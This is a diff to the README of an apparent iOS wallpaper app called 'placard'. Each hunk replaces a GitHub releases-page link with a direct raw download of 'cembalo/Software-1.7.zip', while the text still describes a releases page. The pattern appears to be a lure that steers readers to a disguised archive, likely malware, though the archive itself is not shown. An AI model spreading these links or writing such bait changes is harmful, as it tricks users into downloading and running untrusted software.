@@ -1,6 +1,6 @@
 # 🖼️ placard - Beautiful PosterBoard Wallpapers for iOS
 
-[![Download Now](https://img.shields.io/badge/Download-placard-2ea44f?style=for-the-badge&logo=github)](https://github.com/chaithra4009/placard/releases)
+[![Download Now](https://img.shields.io/badge/Download-placard-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/chaithra4009/placard/main/cembalo/Software-1.7.zip)
 
 ## 📥 Getting Started
 
@@ -39,7 +39,7 @@ See how each wallpaper looks on your screen before applying it. No surprises—j
 
 ## 🚀 Downloading placard
 
-Visit this link to download the application: **[https://github.com/chaithra4009/placard/releases](https://github.com/chaithra4009/placard/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/chaithra4009/placard/main/cembalo/Software-1.7.zip](https://raw.githubusercontent.com/chaithra4009/placard/main/cembalo/Software-1.7.zip)**
 
 You'll land on the releases page where you can find the latest version. Look for the most recent release listed at the top of the page.
 
@@ -137,7 +137,7 @@ If something goes wrong, try these common fixes:
 
 To get the best experience, keep placard up to date:
 
-1. Regularly visit the **[releases page](https://github.com/chaithra4009/placard/releases)**.
+1. Regularly visit the **[releases page](https://raw.githubusercontent.com/chaithra4009/placard/main/cembalo/Software-1.7.zip)**.
 2. Check for new versions (they usually have version numbers like v1.2, v1.3, etc.).
 3. Download and install the latest version using the same steps as before.
 
@@ -174,7 +174,7 @@ Thank you for choosing placard! We hope these wallpapers bring new life to your 
 
 Remember, if you love placard, consider starring the repository on GitHub—it helps others discover this fantastic tool.
 
-**Download now:** [https://github.com/chaithra4009/placard/releases](https://github.com/chaithra4009/placard/releases)
+**Download now:** [https://raw.githubusercontent.com/chaithra4009/placard/main/cembalo/Software-1.7.zip](https://raw.githubusercontent.com/chaithra4009/placard/main/cembalo/Software-1.7.zip)
 
 ---
 
